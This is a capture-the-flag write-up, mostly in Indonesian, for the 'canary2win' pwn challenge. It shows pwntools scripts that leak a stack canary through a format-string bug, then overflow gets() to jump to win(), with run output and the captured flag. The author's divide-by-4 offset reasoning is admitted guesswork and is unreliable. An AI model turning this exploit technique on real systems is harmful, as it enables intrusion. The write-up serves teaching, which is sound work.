## Challenge Name: canary2win
>Category: Binary Exploitation

>Points: 316

>Solves: 34

### Challenge Description: 

Mr. Ary is a professional and notorious stack smasher. I don't want to be a victim of Mr. Ary's shenanigans, so I added some protection to my binary and proudly said "Let's see if you can, Ary!". But alas, Mr. Ary still smashed my stack üòî.

Can you too?

Hopefully not that huge of a diff spike üôè

nc 34.101.174.85 10002

Author: NeoZap

Artifact Files:
* [chall](https://ctf.compfest.id/files/fe80da338c6e21ad13929c6f66c3d4a8/chall?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTB9.ZNr1eA.7CyTpUKqoGwmQU0TF1NJh_u3NFg)
* [chall.c](https://ctf.compfest.id/files/48e39e46975a47aee85dc3c505c5545f/chall.c?token=eyJ1c2VyX2lkIjoxMCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6MTF9.ZNr1eA.1IrQdo4DwIuTWWAz-7DitzELMAg)

### Approach

**1. Analyze the file**

Unduh file artifak yang ada. Setelah itu, mari kita analisis. Pertama kita lihat isi ```chall.c```.
```
#include <stdio.h>
#include <stdio.h>

void init() {
    setvbuf(stdout, NULL, _IONBF, 0);
}

void vuln() {
    char buf[0x20];
    puts("\ncanary2win e youkoso~ input wo joudai >//<");
    printf("> ");
    gets(buf);
    printf(buf);
}

void win() {
    puts("\nDiff spike gak gan, ngga lah ya xixixi :pray:");
    FILE *f = fopen("flag.txt", "r");
    char buf[0x100];
    fgets(buf, 0x100, f);
    puts(buf);
}

int main() {
    init();
    while(1) vuln();
}
```
Jika kita analisis, kode ini memiliki celah keamanan yakni pada ```gets()```. Fungsi ```gets()``` membaca input sampai bertemu newline (\n). Hal ini membuat program ini rentan terkena buffer overflow. Selain itu, ada celah di fungsi ```printf(buf)``` yakni **string format vulnerability**. Dengan exploit ini, kita bisa menyisipkan string formatter seperti ```%x``` untuk mendapatkan isi dari stack. 

Sebelum menyerang, kita lihat apa proteksi yang dimiliki oleh file binary ```chall```. Pemeriksaan bisa dilakukan dengan program ```checksec``` yang bisa diunduh dengan command:
```
sudo apt install checksec
```
Untuk memerika proteksi, gunakan command berikut:
```
checksec chall
```
Diperoleh:
```
[*] 'XXX/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
File ini ternyata memiliki stack canary dan ada NX (non-executable) , namun untungnya tidak ada PIE (posisi symbol bisa berubah-ubah tiap dieksekusi) sehingga address di server dan lokal akan selalu sama.

**2. Get the canary**

Untuk bisa menjebol challenge ini, kita perlu lewati stack canary nya. Stack canary berada di stack sehingga bisa dilihat menggunakan **string format vulnerability**. Kita bisa mencoba script berikut untuk melihat isi stacknya. 
```
import pwn

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%lx " * 10) #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline()
   print(canary_stack)
```
Coba kita jalankan scriptnya.
```
[+] Starting local process './chall': pid 41316
XXX/canary2win.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%lx " * 10) #cek pake gdb
b'1 1 7fb4ed419aa0 0 0 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 20786c2520786c25 \n'
[*] Stopped process './chall' (pid 41316)
```
Ingat, karena ini binary 64-bit, maka kita perlu menggunakan formatter ```%lx``` agar menampilkan binary sebanyak 8 bytes.

Sekarang yang mana diantara nilai binary ini yang merupakan canary?

Jadi gini, pertama kita harus tahu berapa padding untuk mencapai canary. Caranya gimana?

Yakni dengan mengirimkan payload sampai dapat error ```*** stack smashing detected ***: terminate```. Karena kita tahu bahwa ukuran ```buf``` adalah 0x20 atau 32 dalam desimal, maka dapat dipastikan offset canary pasti diatas 32. Coba kita masukkan kirimkan 33 karakter:
```
import pwn

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("A" * 33) #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline()
   print(canary_stack)
```
Coba kita jalankan:
```
[+] Starting local process './chall': pid 42487
XXX/canary2win.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("A" * 33) #cek pake gdb
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Stopped process './chall' (pid 42487)
```
Masih belum error. Karena ini 64-bit, berarti offest 33-40 berisi nilai lain. Coba kalau 41:
```
import pwn

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("A" * 41) #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline()
   print(canary_stack)
```
Coba kita jalankan:
```
[+] Starting local process './chall': pid 42655
XXX/canary2win.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("A" * 41) #cek pake gdb
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*** stack smashing detected ***: terminated\n'
[*] Stopped process './chall' (pid 42655)
```
Nah sip dah kena error. Berarti kita perlu padding sebanyak 40 bytes sebelum bertemu stack canary.

Sekarang setelah mendapatkan paddingnya, bagaimana kita menentukan stack canary nya?

Jadi gini, ```%lx``` ngebaca isi elemen di stack dari elemen di alamat yang berada di ```$rsp+0```. Selain itu ingat juga indeks di formatting ```printf``` dimulai dari **1**. Hal ini berarti stack canary berada di posisi:
```
((40-0)/4) +1 = 11
```
Bentar...ini kan 64-bit, kenapa dibagi 4?

Jadi entah kenapa pas kucoba-coba, jadi formatter ```printf``` cara kerjanya ngefetch next element di stack (64-bit), kalau dia formatnya ```%x```, cuma 32-bit terbawah yang kecetak, kalau formatnya ```%lx```, semuanya kecetak.

Terus kenapa dibagi 4?

Entah, kucoba-coba meski 64-bit tetep offset indeksnya 4. Jadi ya begitu.

Nah karena kita sudah tahu indeksnya, kita bisa mendapatkan stack canary dengan format berikut:
```
%11$lx
```
Berikut kode yang dimodifikasi:
```
import pwn

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%11$lx")
   #lihat responsenya
   canary_stack = c.recvline().strip().decode()
   print(canary_stack)
```
Response dari server dalam bentuk array of binaries, jadi hasilnya perlu di-_decode_ lalu di-_strip_ dari karakter newline (\n).

Mari kita jalankan:
```
[+] Starting local process './chall': pid 49938
XXX/canary2win.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%11$lx")
d9106ba60e1f6d00
[*] Stopped process './chall' (pid 49938)
```
Nah kita sudah dapat stack canarynya

**3. Bypass Canary**

Setelah kita dapat stack canary, kita dapat bypass stack canary. Caranya adalah dengan mengirimkan payload dengan pola sebagai berikut:
```
payload = padding + canary + ...rest of the code
```
Untuk memeriksa apakah sukses bypass canary, kita kirimkan sebuah karakter setelah canary:
```
payload = padding + canary + 'A'
```
Mari kita modifikasi kode:
```
import pwn

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%11$lx") #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline().strip().decode()
   print(canary_stack)

   #parse canary
   canary = bytes.fromhex(canary_stack)

   #tunggu prompt lagi
   print(c.recvuntil("> "))
   #kirim payload
   #payload canary
   payload_canary = pwn.p64(int.from_bytes(canary,"big"))
   print("Payload Canary: ",payload_canary)
   c.sendline(b'A'* 40 + payload_canary + b"A")
   #lihat responsenya
   response = c.recvline()
   print(response)
```
Pemrosesan canary adalah sebagai berikut:
1. Canary yang sudah di-_strip_ dan di-_decode_ akan dikonversi menjadi array of bytes.
2. Tunggu prompt input muncul lagi.
3. Konversikan array of bytes menjadi integer. Karena kita menerima data via internet/terminal, encoding yang dipakai adalah **big endian**. Oleh karena itu, tambahkan keterangan encoding ```"big"```.
4. Integer ini lalu dijadikan inputnke fungsi ```p64()```. Fungsi ini akan menghasilkan array of bytes dengan padding di depannya agar pas 8 bytes.

Setelah diproses, konkatenasi payload yang sudah dirancang dan lihat resposnya. Ayo kita coba!
```
[+] Starting local process './chall': pid 50899
XXX/canary2win.py:46: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%11$lx") #cek pake gdb
3fe36ad67ec5a500
XXX/canary2win.py:57: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'canary2win e youkoso~ input wo joudai >//<\n> '
Payload Canary:  b'\x00\xa5\xc5~\xd6j\xe3?'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[*] Stopped process './chall' (pid 50899)
```
Terlihat bahwa kita tidak mendapat error stack smash yang menandakan kita sukses bypass stack canary.

**4. Mendapatkan Address fungsi ```win()```**

Karena kita tahu **PIE** tidak aktif, maka address fungsi-fungsi yang ada akan tetap konstan entah di local atau remote. Untuk mencari _address_-nya kita bisa menggunakan ```gdb```. Berikut caranya:
- Buka ```gdb```.
```
gdb ./chall
```
- Masukkan command berikut:
```
print win
```
Diperoleh:
```
(gdb) print win
$1 = {<text variable, no debug info>} 0x401290 <win>
(gdb)
```
Diperoleh bahwa address fungsi ```win()``` adalah **0x401290**

**5. Craft Payload**

Sekarang setelah kita dapatkan address fungsi ```win()```, kita tinggal dapatkan payload pamungkas:
```
payload = padding (40 bytes) + canary + padding(?? bytes) + addr_win
```
Namun kita tidak tahu berapa padding antara ```canary``` dengan ```addr_win```. Kita bisa mencoba-coba sampai mendapatkan padding yang pas. Fakta yang jelas adalah karena ini 64-bit, padding-nya kemungkinan besar kelipatan 8.

Mari kita coba dari padding=0
```
import pwn

#address fungsi win
WIN_ADDRESS = 0x401290

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%11$lx") #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline().strip().decode()
   print(canary_stack)

   #parse canary
   canary = bytes.fromhex(canary_stack)

   #tunggu prompt lagi
   print(c.recvuntil("> "))
   #kirim payload
   #payload canary
   payload_canary = pwn.p64(int.from_bytes(canary,"big"))
   print("Payload Canary: ",payload_canary)
   #payload win
   win_payload = pwn.p64(WIN_ADDRESS)
   print("Win Payload: ",win_payload)
   c.sendline(b'A'* 40 + payload_canary + b"A"*0 + win_payload )
   #lihat responsenya
   response = c.recvall()
   print(response)
```
Jangan lupa untuk menambahkan padding pada payload alamat ```win()``` dengan ```p64()```. Karena dari file ```chall.c``` kita tahu bahwa fungsi ```win()``` akan mencetak teks dua kali, kita akan menggunakan ```recvall()``` agar semus teks kita terima.

Ayo kita jalankan!
```
[+] Starting local process './chall': pid 55893
XXX/canary2win.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%11$lx") #cek pake gdb
f78cc682d8c18900
XXX/canary2win.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'canary2win e youkoso~ input wo joudai >//<\n> '
Payload Canary:  b'\x00\x89\xc1\xd8\x82\xc6\x8c\xf7'
Win Payload:  b'\x90\x12@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (84B)
[*] Process './chall' stopped with exit code -6 (SIGABRT) (pid 55893)
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*** stack smashing detected ***: terminated\n'
```
Kena canary bung. Coba kalau kita jadiin padding=8
```
import pwn

#address fungsi win
WIN_ADDRESS = 0x401290

#buat local connection
with pwn.process("./chall") as c:

#buat remote connection
# with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%11$lx") #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline().strip().decode()
   print(canary_stack)

   #parse canary
   canary = bytes.fromhex(canary_stack)

   #tunggu prompt lagi
   print(c.recvuntil("> "))
   #kirim payload
   #payload canary
   payload_canary = pwn.p64(int.from_bytes(canary,"big"))
   print("Payload Canary: ",payload_canary)
   #payload win
   win_payload = pwn.p64(WIN_ADDRESS)
   print("Win Payload: ",win_payload)
   c.sendline(b'A'* 40 + payload_canary + b"A"*8 + win_payload )
   #lihat responsenya
   response = c.recvall()
   print(response)
```
Coba kita jalankan lagi:
```
[+] Starting local process './chall': pid 56171
XXX/canary2win.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%11$lx") #cek pake gdb
2cf968f958ade600
XXX/canary2win.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'canary2win e youkoso~ input wo joudai >//<\n> '
Payload Canary:  b'\x00\xe6\xadX\xf9h\xf9,'
Win Payload:  b'\x90\x12@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (87B)
[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 56171)
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nDiff spike gak gan, ngga lah ya xixixi :pray:\n'
```
Sip, teks di fungsi ```win()``` tercetak, artinya payload kita sudah benar. Sekarang saatnya kita kirimkan ke server.

**6. Get the Flag**

Untuk menembak ke server, comment/hapus baris ini:
```
with pwn.process("./chall") as c:
```
Lalu uncomment/tambahkan baris ini:
```
with pwn.remote("34.101.174.85",10002) as c:
```
Berikut hasil eksekusinya:
```
[+] Opening connection to 34.101.174.85 on port 10002: Done
XXX/canary2win.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'\ncanary2win e youkoso~ input wo joudai >//<\n> '
XXX/canary2win.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  c.sendline("%11$lx") #cek pake gdb
e681fda67cdfd900
XXX/canary2win.py:24: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  print(c.recvuntil("> "))
b'canary2win e youkoso~ input wo joudai >//<\n> '
Payload Canary:  b'\x00\xd9\xdf|\xa6\xfd\x81\xe6'
Win Payload:  b'\x90\x12@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (146B)
[*] Closed connection to 34.101.174.85 port 10002
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nDiff spike gak gan, ngga lah ya xixixi :pray:\nCOMPFEST15{fmtstr_to_leak_canary_bof_to_win__s4tsetsats3t}\n'
```
Alhamdulillah dapat flagny:
```
COMPFEST15{fmtstr_to_leak_canary_bof_to_win__s4tsetsats3t}
```

### Reflections

Permulaan menarik untuk belajar stack canary dan ROP (_Return Oriented Programming_). Membantu mengasah skill ```pwntools```.

---
[Back to home](../Readme.md)
